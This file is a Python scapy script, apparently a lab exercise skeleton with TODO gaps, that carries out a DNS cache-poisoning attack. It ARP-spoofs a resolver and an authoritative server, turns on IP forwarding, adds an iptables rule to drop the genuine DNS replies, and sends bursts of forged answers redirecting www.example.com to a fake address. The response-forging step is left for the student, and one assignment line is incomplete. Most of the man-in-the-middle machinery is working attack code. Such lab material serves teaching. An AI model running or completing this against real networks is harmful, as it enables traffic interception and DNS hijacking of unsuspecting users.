#!/usr/bin/python3
from scapy.all import *
import atexit
import signal
import subprocess
import sys
import threading
import time

RESOLVER_IP = "10.9.0.53"
AUTH_SERVER_IP = "" # TODO
ATTACKER_IP = "10.9.0.10"
TARGET_DOMAIN = "www.example.com"
FAKE_IP = "" # TODO
POISON_INTERVAL = 1.0

################### DO NOT TOUCH ####################
running = True
resolver_mac = None
auth_mac = None


def set_ip_forward(enabled):
    value = "1" if enabled else "0"
    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"], check=False, stdout=subprocess.DEVNULL)


def set_drop_rule(enabled):
    base_cmd = [
        "iptables",
        "-w",
        "-t",
        "filter",
        "FORWARD",
        "-p",
        "udp",
        "-s",
        AUTH_SERVER_IP,
        "-d",
        RESOLVER_IP,
        "--sport",
        "53",
        "--dport",
        "33333",
        "-j",
        "DROP",
    ]
    action = "-I" if enabled else "-D"
    subprocess.run(["iptables", "-w", action, *base_cmd[4:]], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def resolve_mac(ip):
    ans = srp1(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        verbose=0,
    )
    if ans and ans.haslayer(ARP):
        return ans[ARP].hwsrc
    return None


def poison_once():
    # Tell resolver that authoritative IP is at attacker MAC.
    sendp(
        Ether(dst=resolver_mac) / ARP(op=2, psrc=AUTH_SERVER_IP, pdst=RESOLVER_IP, hwdst=resolver_mac),
        verbose=0,
    )
    # Tell authoritative that resolver IP is at attacker MAC.
    sendp(
        Ether(dst=auth_mac) / ARP(op=2, psrc=RESOLVER_IP, pdst=AUTH_SERVER_IP, hwdst=auth_mac),
        verbose=0,
    )


def restore_arp():
    if not resolver_mac or not auth_mac:
        return
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=AUTH_SERVER_IP, hwsrc=auth_mac, pdst=RESOLVER_IP, hwdst="ff:ff:ff:ff:ff:ff"),
        count=5,
        verbose=0,
    )
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=RESOLVER_IP, hwsrc=resolver_mac, pdst=AUTH_SERVER_IP, hwdst="ff:ff:ff:ff:ff:ff"),
        count=5,
        verbose=0,
    )


def poison_loop():
    while running:
        poison_once()
        time.sleep(POISON_INTERVAL)


def stop_handler(signum, frame):
    del signum, frame
    global running
    running = False
#################### DO NOT TOUCH ####################


def spoof_dns(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS) and pkt[DNS].qd):
        return

    qname = # TODO Extract the queried domain name from the DNS query packet

    if pkt[IP].src == RESOLVER_IP and pkt[IP].dst == AUTH_SERVER_IP and qname == TARGET_DOMAIN.lower():
        # TODO: Craft a forged DNS response with the same transaction ID and source port as the query, but with FAKE_IP as the answer.


        # Send a larger L2 burst so spoofed packets arrive before resolver retries.
        sendp([forged] * 64, verbose=0)

        print(f"[+] Sent forged response burst for {TARGET_DOMAIN} -> {FAKE_IP}")

if __name__ == "__main__":
    print("[*] Resolving target MAC addresses...")
    resolver_mac = resolve_mac(RESOLVER_IP)
    auth_mac = resolve_mac(AUTH_SERVER_IP)

    if not resolver_mac or not auth_mac:
        print("[!] Could not resolve resolver/authoritative MAC addresses.")
        sys.exit(1)

    print(f"[*] Resolver MAC: {resolver_mac}")
    print(f"[*] Authoritative MAC: {auth_mac}")

    set_ip_forward(True)
    set_drop_rule(True)
    atexit.register(restore_arp)
    atexit.register(lambda: set_drop_rule(False))
    atexit.register(lambda: set_ip_forward(False))
    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    poisoner = threading.Thread(target=poison_loop, daemon=True)
    poisoner.start()

    print(f"[*] MITM active. Sniffing DNS queries {RESOLVER_IP} -> {AUTH_SERVER_IP}...")
    sniff(
        filter=f"udp and src host {RESOLVER_IP} and dst host {AUTH_SERVER_IP} and dst port 53",
        prn=spoof_dns,
        stop_filter=lambda _: not running,
    )

    restore_arp()
    set_drop_rule(False)
    set_ip_forward(False)
